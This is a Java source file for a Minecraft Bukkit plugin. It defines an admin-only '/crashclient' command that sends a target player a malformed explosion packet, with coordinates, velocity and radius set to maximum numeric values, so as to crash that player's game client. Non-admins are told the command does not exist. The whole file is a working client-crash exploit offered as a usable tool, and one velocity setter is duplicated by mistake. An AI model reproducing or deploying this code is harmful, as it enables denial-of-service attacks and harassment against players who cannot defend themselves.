package minecraft.sightworld.bukkitapi.commands.impl;

import minecraft.sightworld.bukkitapi.SightWorld;
import minecraft.sightworld.bukkitapi.commands.BukkitCommand;
import minecraft.sightworld.bukkitapi.packet.other.WrapperPlayServerExplosion;
import minecraft.sightworld.defaultlib.user.User;
import org.bukkit.Bukkit;

import java.util.List;

public class CrashClientCommand extends BukkitCommand<SightWorld> {
    public CrashClientCommand(SightWorld plugin) {
        super(plugin, "crashclient");
    }

    @Override
    public void execute(User<?> entity, String[] args) {
        if (!entity.hasPermission("sightworld.admin")) {
            entity.sendMessage("§cНеизвестная команда!");
            return;
        }
        if (args.length == 0) {
            entity.sendMessage("§cИспользуйте /crashclient <игрок>");
            return;
        }

        WrapperPlayServerExplosion wrapper = new WrapperPlayServerExplosion();
        wrapper.setX(Double.MAX_VALUE);
        wrapper.setY(Double.MAX_VALUE);
        wrapper.setZ(Double.MAX_VALUE);
        wrapper.setPlayerVelocityX(Float.MAX_VALUE);
        wrapper.setPlayerVelocityY(Float.MAX_VALUE);
        wrapper.setPlayerVelocityX(Float.MAX_VALUE);
        wrapper.setRadius(Float.MAX_VALUE);

        wrapper.sendPacket(Bukkit.getPlayer(args[0]));
    }

    @Override
    public List<String> tabComplete(User<?> entity, String[] args) {
        return null;
    }
}
